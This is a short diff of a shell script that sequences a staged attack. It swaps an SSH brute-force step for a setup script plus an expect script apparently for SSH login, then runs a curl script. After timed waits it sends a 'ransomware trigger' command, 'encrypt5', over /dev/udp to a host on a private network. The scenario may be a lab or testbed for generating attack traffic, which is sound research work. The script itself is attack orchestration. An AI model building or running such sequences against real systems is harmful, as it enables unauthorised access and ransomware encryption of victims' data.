@@ -1,12 +1,19 @@
-sleep 600
 
-bash ./ssh_brute_force.bash &
+bash ./setup_1.bash &
 
-sleep 360
+sleep 400
+
+
+./ssh_pass_success.exp &
+
+sleep 120
 bash ./curl.bash
 
-# wait one hour
-sleep 3600
+# wait 20 minutes
+sleep 1200
 
 # launch ransomeware trigger
 echo "idru5991a:execute:encrypt5" > /dev/udp/192.168.1.4/54321
+
+# what forever
+sleep 100000
